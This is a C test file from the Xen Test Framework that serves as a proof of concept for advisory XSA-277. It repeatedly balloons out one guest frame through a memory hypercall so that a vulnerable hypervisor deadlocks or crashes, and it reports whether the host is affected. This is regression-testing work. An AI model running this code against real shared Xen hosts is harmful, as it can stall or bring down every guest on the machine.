/**
 * @file tests/xsa-277/main.c
 * @ref test-xsa-277
 *
 * @page test-xsa-277 XSA-277
 *
 * Advisory: [XSA-277](https://xenbits.xen.org/xsa/advisory-277.html)
 *
 * Before XSA-277, an error path in the P2M code left a spinlock held when the
 * guest tried to remove a page which was already not present.
 *
 * Attempt to balloon out the same frame three times, to try and force a
 * deadlock.
 *
 * For debug builds of Xen, this should hit an assertion on the return to
 * guest path.  For release builds, the test should never complete, and will
 * either stall the entire system in the TSC rendezvous, or cause a crash from
 * the watchdog (if activated).
 *
 * @see tests/xsa-277/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-277 PoC";

static uint8_t balloon[PAGE_SIZE] __page_aligned_bss;

void test_main(void)
{
    unsigned long extents[] = {
        virt_to_gfn(balloon),
    };
    struct xen_memory_reservation mr = {
        .extent_start = extents,
        .nr_extents = ARRAY_SIZE(extents),
        .domid = DOMID_SELF,
    };

    /* Balloon out once.  Should succeed. */
    if ( hypercall_memory_op(XENMEM_decrease_reservation, &mr) != 1 )
        return xtf_error("Error trying to balloon out gfn %lx\n", extents[0]);

    /*
     * Balloon out twice.  Should fail, but when vulnerable to XSA-277, the
     * hypercall will leave the p2m lock held.
     */
    if ( hypercall_memory_op(XENMEM_decrease_reservation, &mr) != 0 )
        return xtf_failure("Fail: Probably vulnerable to XSA-277\n");

    /* Balloon out thrice.  If vulnerable, will deadlock. */
    if ( hypercall_memory_op(XENMEM_decrease_reservation, &mr) != 0 )
        return xtf_failure("Fail: Probably vulnerable to XSA-277\n");

    xtf_success("Success: Not vulnerable to XSA-277\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
